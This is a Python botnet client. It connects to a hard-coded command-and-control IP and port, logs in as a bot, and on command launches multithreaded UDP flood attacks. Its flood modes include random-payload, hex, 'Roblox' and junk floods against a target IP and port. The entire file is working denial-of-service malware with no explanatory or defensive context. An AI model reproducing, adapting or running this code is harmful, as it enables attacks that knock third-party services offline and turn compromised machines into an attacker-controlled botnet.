import socket
import threading
import time
import random
import ctypes

C2_ADDRESS = "147.185.221.24"
C2_PORT = 21142

def attack_udp(ip, port, secs, size=65500):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dport = random.randint(1, 65535) if port == 0 else port
        data = random._urandom(size)
        s.sendto(data, (ip, dport))
        s.close()

def attack_hex(ip, port, secs):
    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.close()

def attack_roblox(ip, port, secs, size=65400):
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(size)
        dport = random.randint(1, 65535) if port == 0 else port
        for _ in range(1500):
            ran = random.randrange(10 ** 80)
            hex_str = "%064x" % ran
            hex_str = hex_str[:64]
            s.sendto(bytes.fromhex(hex_str) + bytes_data, (ip, dport))
        s.close()

def attack_junk(ip, port, secs):
    payload = b'\x00' * 70
    while time.time() < secs:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(payload, (ip, port))
        s.close()

def handle_c2_connection(c2):
    c2.send(b'669787761736865726500')
    while True:
        time.sleep(1)
        data = c2.recv(1024)
        if b'Username' in data:
            c2.send(b'BOT')
            break
    while True:
        time.sleep(1)
        data = c2.recv(1024)
        if b'Password' in data:
            c2.send(b'\xff\xff\xff\xff\75')
            break
    while True:
        try:
            data = c2.recv(1024).strip()
            if not data:
                break
            args = data.split(b' ')
            command = args[0].upper()
            print("Received request: " + data.decode())
            if command == b'!UDP':
                ip = args[1].decode()
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs)).start()
            elif command == b'!HEX':
                ip = args[1].decode()
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_hex, args=(ip, port, secs)).start()
            elif command == b'!ROBLOX':
                ip = args[1].decode()
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs)).start()
            elif command == b'!JUNK':
                ip = args[1].decode()
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                for _ in range(threads):
                    threading.Thread(target=attack_junk, args=(ip, port, secs)).start()
            elif command == b'!PING':
                c2.send(b'PONG')
        except:
            break
    c2.close()

def reconnect_thread():
    while True:
        try:
            c2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            c2.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            c2.connect((C2_ADDRESS, C2_PORT))
            threading.Thread(target=handle_c2_connection, args=(c2,)).start()
            break
        except:
            if 'c2' in locals():
                c2.close()
            time.sleep(1)

def main():
    while True:
        threading.Thread(target=reconnect_thread).start()
        time.sleep(30)

if __name__ == '__main__':
    main()